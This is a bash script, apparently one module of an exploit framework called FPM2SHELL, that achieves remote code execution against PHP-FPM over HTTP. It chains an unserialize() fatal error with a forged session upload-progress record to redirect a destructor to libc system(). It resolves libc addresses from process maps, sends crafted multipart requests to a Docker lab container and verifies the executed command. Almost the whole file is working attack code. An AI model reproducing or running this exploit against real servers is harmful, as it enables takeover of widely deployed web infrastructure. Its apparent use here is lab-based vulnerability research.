#!/usr/bin/env bash
# FPM2SHELL module 3e: HTTP-only delivery.
#
#   A  : @unserialize() app-level fatal -> dangling php_unserialize_data
#   B  : multipart upload-progress record -> stale decoder -> forged R:
#        reference -> fake array -> pDestructor = libc system()
#
# B's session key carries the forged decoder struct in the progress field
# value; the same request reads the record back at FILE_END/END cleanup.
set -u
SID="${F2S_SID:-f2shttp0000000000000000000001}"
D="${F2S_D:-0x7f886e26c000}"
STRUCT_OFF="${F2S_STRUCT_OFF:-0x1fe8}"
CTL_LEN="${F2S_CTL_LEN:-65300}"
CMD="${F2S_CMD:-id>/tmp/f2s_pwn}"
LAB="$(cd "$(dirname "$0")" && pwd)"
TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT

# ---- request A body (app fatal) --------------------------------------------
python3 - "$TMP" <<'PYEOF'
import sys
B = b"----f2sfatal00000000"
def part(n, b):
    return (b"--" + B + b"\r\nContent-Disposition: form-data; name=\"" + n +
            b"\"\r\n\r\n" + b + b"\r\n")
elems = b"".join(b"i:%d;a:1:{i:0;i:1;}" % i for i in range(40000))
open(sys.argv[1] + "/fatal", "wb").write(
    part(b"filler", b"Q" * 4000000) +
    part(b"data", b"a:%d:{%s}" % (40000, elems)) + b"--" + B + b"--\r\n")
PYEOF

echo "[i] recycling worker"
docker exec f2s-php sh -c "kill \$(pgrep gdb) 2>/dev/null; kill \$(pgrep -f 'pool www') 2>/dev/null" || true
sleep 1.5
PID=$(docker exec f2s-php pgrep -f 'pool www' | head -1)
echo "[i] worker=$PID"
BASE=$(docker exec f2s-php sh -c "awk '/libc\\.so\\.6/ && \$3==\"00000000\" {split(\$1,a,\"-\"); print a[1]; exit}' /proc/$PID/maps")
if [ -z "$BASE" ]; then echo "[!] no libc base"; exit 1; fi
SYSTEM=$(python3 -c "print(hex(int('$BASE',16)+0x53090))")
echo "[i] libc=$BASE system=$SYSTEM"

docker exec f2s-php sh -c "rm -f /tmp/sess_$SID"
python3 "$LAB/m3_http.py" --d "$D" --system "$SYSTEM" --ctl-len "$CTL_LEN" \
    --struct-off "$STRUCT_OFF" --sid "$SID" --cmd "$CMD" --out "$TMP/b.bin"
ls -l "$TMP/b.bin"

post() {
  python3 - "$1" "$2" "$SID" <<'PYEOF'
import sys, http.client
path, bf, sid = sys.argv[1], sys.argv[2], sys.argv[3]
body = open(bf, "rb").read()
B = b"----f2shttp00000000"
c = http.client.HTTPConnection("127.0.0.1", 18120, timeout=60)
try:
    c.request("POST", path, body=body, headers={
        "Content-Type": f"multipart/form-data; boundary={B.decode()}",
        "Content-Length": str(len(body)),
        "Cookie": f"PHPSESSID={sid}"})
    r = c.getresponse()
    print("[%s]" % path, r.status, r.read(80).decode("latin1", "replace")[:60])
except Exception as e:
    print("[%s]" % path, "ERR", e)
finally:
    c.close()
PYEOF
}

docker cp "$LAB/g11.gdb" f2s-php:/tmp/g11.gdb
docker exec f2s-php sh -c ": > /tmp/http.out"

echo "[i] A (fatal)"
post /index.php "$TMP/fatal"
sleep 0.3

docker exec -d f2s-php sh -c "gdb -batch -p $PID -x /tmp/g11.gdb > /tmp/http.out 2>&1"
sleep 2.5

echo "[i] B (record)"
post /index.php "$TMP/b.bin"
sleep 1.0

echo "[i] worker after: $(docker exec f2s-php pgrep -f 'pool www' | head -1)"
echo "[i] proof:"
docker exec f2s-php sh -c "ls -l /tmp/f2s_pwn 2>/dev/null; cat /tmp/f2s_pwn 2>/dev/null"
echo "[i] gdb:"
docker exec f2s-php sh -c "grep -aE 'VARTMP|RCDTOR|SYSTEM|SIGSEGV|^#[0-9]' /tmp/http.out | head -50"
